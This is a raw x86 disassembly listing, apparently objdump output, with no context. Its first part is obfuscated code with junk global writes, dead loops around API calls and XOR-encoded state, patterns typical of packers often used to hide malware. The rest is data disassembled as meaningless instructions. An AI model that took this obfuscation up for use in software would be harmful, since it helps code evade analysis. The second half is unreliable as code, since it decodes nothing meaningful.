  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423913
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x4238fe
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a34
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0xe5d7ebdc
  41ccad:	(bad)  
  41ccae:	ror    ch,1
  41ccb0:	xchg   edi,eax
  41ccb1:	cld    
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx-0x5d]
  41ccb9:	push   0x31
  41ccbb:	adc    dh,al
  41ccbd:	lods   al,BYTE PTR ds:[esi]
  41ccbe:	cmp    al,0xd6
  41ccc0:	mov    ah,0x5
  41ccc2:	jbe    0x41cd35
  41ccc4:	rol    BYTE PTR [esi],cl
  41ccc6:	sub    bl,BYTE PTR [ebx-0x1e7a9e86]
  41cccc:	test   DWORD PTR [edi+0x2a],ebx
  41cccf:	stos   DWORD PTR es:[edi],eax
  41ccd0:	mov    dh,0x9c
  41ccd2:	cmp    bh,BYTE PTR [edx]
  41ccd4:	stos   BYTE PTR es:[edi],al
  41ccd5:	cmp    DWORD PTR [edx+0x44],0xb7115231
  41ccdc:	jo     0x41ccb3
  41ccde:	pop    ebp
  41ccdf:	xchg   BYTE PTR [eax+0xb28fb6b],al
  41cce5:	xor    BYTE PTR [edx],bl
  41cce7:	sub    BYTE PTR [ebx-0x6a1f0587],0x87
  41ccee:	(bad)  
  41ccef:	mov    ds:0x99ccacb2,eax
  41ccf4:	mov    eax,ds:0x72d93485
  41ccf9:	out    0xc4,eax
  41ccfb:	idiv   BYTE PTR [ebp-0x14]
  41ccfe:	ins    BYTE PTR es:[edi],dx
  41ccff:	mov    al,0x1e
  41cd01:	or     DWORD PTR [eax-0x520ee779],ecx
  41cd07:	sar    cl,1
  41cd09:	dec    ecx
  41cd0a:	pusha  
  41cd0b:	imul   ebp,DWORD PTR [edx],0x91366c65
  41cd11:	xchg   edi,eax
  41cd12:	xor    eax,0x1157e16e
  41cd17:	dec    esi
  41cd18:	pop    edx
  41cd19:	add    DWORD PTR [edi],ebx
  41cd1b:	test   eax,0x381011af
  41cd20:	nop
  41cd21:	xor    ebp,ecx
  41cd23:	test   eax,0xe74c703c
  41cd28:	scas   eax,DWORD PTR es:[edi]
  41cd29:	or     al,0x3b
  41cd2b:	xor    ebx,ebp
  41cd2d:	mov    edi,0x94201481
  41cd32:	fisub  WORD PTR [eax-0x13]
  41cd35:	xor    ebp,DWORD PTR [ebp+0x71]
  41cd38:	adc    BYTE PTR [ecx-0x6e],ch
  41cd3b:	jg     0x41ccc7
  41cd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd3e:	jns    0x41ccd7
  41cd40:	mov    al,0x24
  41cd42:	push   cs
  41cd43:	stc    
  41cd44:	mov    BYTE PTR [ebp+0x164b51bf],al
  41cd4a:	mov    dl,bh
  41cd4c:	sbb    eax,0xca41bf59
  41cd51:	or     cl,BYTE PTR [ebx]
  41cd53:	mov    bh,0xce
  41cd55:	inc    ecx
  41cd56:	push   ebx
  41cd57:	jnp    0x41cd00
  41cd59:	cwde   
  41cd5a:	pop    esi
  41cd5b:	dec    ebx
  41cd5c:	loopne 0x41cd0e
  41cd5e:	in     eax,0x55
  41cd60:	jle    0x41cdad
  41cd62:	mov    es,edi
  41cd64:	js     0x41cce9
  41cd66:	and    BYTE PTR [ebx+eiz*1-0x49e0651f],al
  41cd6d:	out    dx,eax
  41cd6e:	mov    edx,ds
  41cd70:	add    al,0x27
  41cd72:	call   DWORD PTR [edi+0x80a185]
  41cd78:	hlt    
  41cd79:	js     0x41cd58
  41cd7b:	fs aad 0x6
  41cd7e:	xchg   ebx,eax
  41cd7f:	mov    ch,0x6b
  41cd81:	push   ecx
  41cd82:	xchg   esi,eax
  41cd83:	(bad)  
  41cd84:	stos   DWORD PTR es:[edi],eax
  41cd85:	sbb    esi,DWORD PTR [edx+esi*4]
  41cd88:	jo     0x41cd98
  41cd8a:	lahf   
  41cd8b:	popf   
  41cd8c:	retf   
  41cd8d:	mov    ebp,0x525f1c1a
  41cd92:	adc    dh,bl
  41cd94:	fcmovb st,st(4)
  41cd96:	lods   eax,DWORD PTR ds:[esi]
  41cd97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd98:	inc    edx
  41cd99:	nop
  41cd9a:	mov    al,ds:0xb6330808
  41cd9f:	sub    al,0xf3
  41cda1:	push   edi
  41cda2:	lods   al,BYTE PTR ds:[esi]
  41cda3:	icebp  
  41cda4:	and    al,0xf
  41cda6:	push   eax
  41cda7:	outs   dx,BYTE PTR ds:[esi]
  41cda8:	hlt    
  41cda9:	mov    ah,0xbd
  41cdab:	shl    DWORD PTR [eax-0x7356271f],0x72
  41cdb2:	cli    
  41cdb3:	push   ds
  41cdb4:	mov    ds:0xf9b7fa2a,eax
  41cdb9:	dec    esi
  41cdba:	xor    dh,ah
  41cdbc:	push   edi
  41cdbd:	xor    BYTE PTR [edx+0x13],dh
  41cdc0:	jnp    0x41cd45
  41cdc2:	lods   eax,DWORD PTR ds:[esi]
  41cdc3:	lahf   
  41cdc4:	js     0x41ce26
  41cdc6:	mov    BYTE PTR [esi+edi*2-0xd],ch
  41cdca:	inc    ebp
  41cdcb:	or     al,0x62
  41cdcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdce:	fbld   TBYTE PTR [ecx]
  41cdd0:	push   ebx
  41cdd1:	xor    bh,BYTE PTR [edi-0x4c]
  41cdd4:	xchg   edx,eax
  41cdd5:	out    0x7b,eax
  41cdd7:	mov    ebp,0xe53d88f7
  41cddc:	pop    esp
  41cddd:	inc    ebx
  41cdde:	pusha  
  41cddf:	and    ah,BYTE PTR es:[ebp+0x1917a5d]
  41cde6:	push   edi
  41cde7:	push   edi
  41cde8:	xchg   ebp,eax
  41cde9:	in     eax,dx
  41cdea:	pop    ebx
  41cdeb:	clc    
  41cdec:	xchg   edi,eax
  41cdee:	daa    
  41cdef:	jle    0x41cdca
  41cdf1:	ins    DWORD PTR es:[edi],dx
  41cdf2:	pop    ebp
  41cdf3:	inc    ecx
  41cdf4:	jbe    0x41cda4
  41cdf6:	scas   al,BYTE PTR es:[edi]
  41cdf7:	cmp    eax,ebx
  41cdf9:	icebp  
  41cdfa:	loop   0x41ce71
  41cdfc:	mov    bl,0xaa
  41cdfe:	add    BYTE PTR [eax+0x72],bh
  41ce01:	adc    al,0xc2
  41ce03:	mov    ds:0xdcfa648a,al
  41ce08:	sahf   
  41ce09:	retf   
  41ce0a:	rol    BYTE PTR [eax-0x12],cl
  41ce0d:	dec    ebx
  41ce0e:	pop    ss
  41ce0f:	mov    ch,0xb6
  41ce11:	rol    DWORD PTR [esi+0x4b],0xce
  41ce15:	add    al,0x44
  41ce17:	cmp    al,0x7
  41ce19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce1a:	scas   eax,DWORD PTR es:[edi]
  41ce1b:	dec    eax
  41ce1c:	xor    ecx,ebp
  41ce1e:	es in  al,dx
  41ce20:	test   al,0xf
  41ce22:	mov    bh,0x11
  41ce24:	xchg   edx,eax
  41ce25:	push   ebx
  41ce26:	mov    BYTE PTR [edx-0x245588cc],al
  41ce2c:	push   ss
  41ce2d:	push   cs
  41ce2e:	out    0x42,al
  41ce30:	pop    esi
  41ce31:	lods   eax,DWORD PTR ds:[esi]
  41ce32:	fdiv   QWORD PTR [edx-0x63b7dc47]
  41ce38:	cmovno esi,DWORD PTR [ebp-0x6f]
  41ce3c:	sbb    DWORD PTR [esi],ecx
  41ce3e:	mov    ebp,0x1f0b748f
  41ce43:	repnz inc esp
  41ce45:	and    bl,dh
  41ce47:	mov    ds,WORD PTR ds:0xc9f9f83a
  41ce4d:	into   
  41ce4e:	pop    ebx
  41ce4f:	hlt    
  41ce50:	sbb    al,0xe0
  41ce52:	mov    al,ds:0x58cc63f
  41ce57:	mov    BYTE PTR [ecx+0x4],ah
  41ce5a:	pushf  
  41ce5b:	push   cs
  41ce5c:	outs   dx,BYTE PTR ds:[esi]
  41ce5d:	jo     0x41ce4e
  41ce5f:	ss retf 0x9113
  41ce63:	fucom  st(2)
  41ce65:	retf   
  41ce66:	sbb    BYTE PTR [edx+0x7b5aa6ac],al
  41ce6c:	dec    ebx
  41ce6d:	enter  0xcbe7,0x3a
  41ce71:	xor    BYTE PTR [esi+0x64952922],0xae
  41ce78:	mov    al,0xeb
  41ce7a:	bound  esp,QWORD PTR [edi-0x25]
  41ce7d:	test   al,0xf
  41ce80:	xchg   ebp,eax
  41ce81:	es dec eax
  41ce83:	les    ecx,FWORD PTR [edx]
  41ce85:	mov    cl,0x9c
  41ce87:	test   al,0xba
  41ce89:	or     DWORD PTR [ebx+eiz*1+0x75],edx
  41ce8d:	xchg   ebp,eax
  41ce8e:	cmc    
  41ce8f:	pop    esi
  41ce90:	jecxz  0x41ce49
  41ce92:	cmp    DWORD PTR [ebx],esi
  41ce94:	mov    esp,gs
  41ce96:	xchg   esi,eax
  41ce97:	dec    esp
  41ce98:	test   DWORD PTR [edx],edi
  41ce9a:	mov    ah,0xe7
  41ce9c:	(bad)  
  41ce9d:	mov    bl,0x2
  41ce9f:	les    esi,FWORD PTR [ecx]
  41cea1:	adc    eax,0x3e42b4ce
  41cea6:	sbb    cl,cl
  41cea8:	cmp    al,0x64
  41ceaa:	(bad)  
  41ceab:	sub    ebx,DWORD PTR [edi]
  41cead:	les    ebx,FWORD PTR [ecx]
  41ceaf:	out    dx,al
  41ceb0:	lods   eax,DWORD PTR ds:[esi]
  41ceb1:	rol    dh,0x28
  41ceb4:	pushf  
  41ceb5:	(bad)
  41ceb8:	callw  0xcead
  41cebc:	jle    0x41ceaa
  41cebe:	or     BYTE PTR [edx-0x40],cl
  41cec1:	in     eax,dx
  41cec2:	dec    eax
  41cec3:	dec    edx
  41cec4:	jp     0x41cf0a
  41cec6:	xchg   ecx,eax
  41cec7:	daa    
  41cec8:	cwde   
  41cec9:	std    
  41ceca:	sub    BYTE PTR [edi+0x4baaf12c],bl
  41ced0:	xor    dl,bl
  41ced2:	test   ah,ch
  41ced4:	inc    ecx
  41ced5:	or     al,0xd6
  41ced7:	mov    DWORD PTR [esi],0x67c24ec7
  41cedd:	or     edi,DWORD PTR [ecx+0x2a]
  41cee0:	mov    bh,0xfc
  41cee2:	retf   
  41cee3:	mov    esp,0x10454b19
  41cee8:	mov    edi,0xfa4dce76
  41ceed:	aaa    
  41ceee:	in     al,0x78
  41cef0:	sub    DWORD PTR [esi-0x50],ebp
  41cef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cef4:	stos   DWORD PTR es:[edi],eax
  41cef5:	mov    esp,0x414acb75
  41cefa:	mov    esp,0xbeb1022c
  41ceff:	test   DWORD PTR [ebx+0x15],eax
  41cf02:	xlat   BYTE PTR ds:[ebx]
  41cf03:	pop    edi
  41cf04:	in     al,dx
  41cf05:	cdq    
  41cf06:	lds    ebx,FWORD PTR [edi]
  41cf08:	mov    ah,0x8d
  41cf0a:	cmc    
  41cf0b:	cwde   
  41cf0c:	test   BYTE PTR [eax+edx*2],ch
  41cf0f:	(bad)  
  41cf10:	call   0x14e5fa4a
  41cf15:	and    DWORD PTR [ebx],esi
  41cf17:	repz (bad) 
  41cf19:	mov    dl,0x78
  41cf1b:	pop    edi
  41cf1c:	fisttp DWORD PTR [esi+0x72326cc2]
  41cf22:	lds    ebp,FWORD PTR es:[ecx]
  41cf25:	faddp  st(6),st
  41cf27:	pop    esi
  41cf28:	jmp    0x9cce:0x56c7db28
  41cf2f:	xchg   ecx,eax
  41cf30:	sti    
  41cf31:	mov    ebx,0x63e99632
  41cf36:	inc    edi
  41cf37:	inc    ebx
  41cf38:	std    
  41cf39:	xchg   ebx,eax
  41cf3a:	retf   
  41cf3b:	mov    al,BYTE PTR [edx+0x47]
  41cf3e:	cmp    ch,0x63
  41cf41:	sub    eax,0xb719d6f4
  41cf46:	out    0x0,al
  41cf48:	cdq    
  41cf49:	inc    esi
  41cf4a:	adc    bh,dl
  41cf4c:	sub    al,0x7e
  41cf4e:	adc    edx,DWORD PTR [edx]
  41cf50:	stos   DWORD PTR es:[edi],eax
  41cf51:	cmp    BYTE PTR [eax+0x427ce6ff],0x89
  41cf58:	pushf  
  41cf59:	aam    0xa2
  41cf5b:	fidivr WORD PTR [eax-0x8ec2c25]
  41cf61:	int    0xad
  41cf63:	mov    bh,BYTE PTR [esi-0x11]
  41cf66:	mov    ah,0xec
  41cf68:	xchg   BYTE PTR [eax+0x4989fd17],bl
  41cf6e:	test   al,0xb1
  41cf70:	push   0x2cb3335e
  41cf75:	sbb    BYTE PTR [edi+ecx*4+0x2],ch
  41cf79:	jecxz  0x41cfce
  41cf7b:	rcl    DWORD PTR [eax-0xa],1
  41cf7e:	popf   
  41cf7f:	cli    
  41cf80:	xchg   esi,eax
  41cf81:	popa   
  41cf82:	adc    BYTE PTR [ebp-0x1],cl
  41cf85:	mov    db6,ecx
  41cf88:	mov    esp,0xdd5196e9
  41cf8d:	jmp    0xd1b0:0xb65d8611
  41cf94:	daa    
  41cf95:	leave  
  41cf96:	js     0x41cfc4
  41cf98:	rcl    BYTE PTR [esi],cl
  41cf9a:	sub    al,0x42
  41cf9c:	pop    ebx
  41cf9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf9e:	sub    DWORD PTR ds:0xf28b2572,edi
  41cfa4:	cli    
  41cfa5:	jmp    0x6b60a2a5
  41cfaa:	and    al,0x1c
  41cfac:	jns    0x41cf57
  41cfae:	mov    ecx,0xe59c2401
  41cfb3:	test   eax,0x9fcded10
  41cfb8:	or     al,0x54
  41cfba:	push   ecx
  41cfbb:	in     al,0x8f
  41cfbd:	getsec 
  41cfbf:	mov    bh,0xb9
  41cfc1:	call   0x61da:0xe6232903
  41cfc8:	in     eax,0xe5
  41cfca:	inc    eax
  41cfcc:	ror    DWORD PTR [ecx],cl
  41cfce:	jmp    0xd65a179d
  41cfd3:	jo     0x41cfe1
  41cfd5:	in     al,0xa6
  41cfd7:	in     eax,0x3c
  41cfd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfda:	pop    eax
  41cfdb:	mov    eax,DWORD PTR [eax-0x12]
  41cfde:	rol    DWORD PTR [esi+0xfab3a60],cl
  41cfe4:	inc    esp
  41cfe5:	shl    ecx,1
  41cfe7:	(bad)  
  41cfe9:	in     eax,dx
  41cfea:	lea    ebx,[ecx-0x48]
  41cfed:	loopne 0x41cf7b
  41cfef:	push   ebp
  41cff0:	mov    eax,0x7cf4e23f
  41cff5:	lahf   
  41cff6:	in     al,dx
  41cff7:	jo     0x41cf81
  41cff9:	jmp    0xace4:0x7951aad0
  41d000:	stos   BYTE PTR es:[edi],al
  41d001:	jb     0x41cfb6
  41d003:	jle    0x41cfa7
  41d005:	fld    TBYTE PTR ds:0xce15c0bd
  41d00b:	jne    0x41cfb8
  41d00d:	std    
  41d00e:	repz push ecx
  41d010:	or     ebp,DWORD PTR [eax+ecx*8]
  41d013:	or     eax,0x6998175b
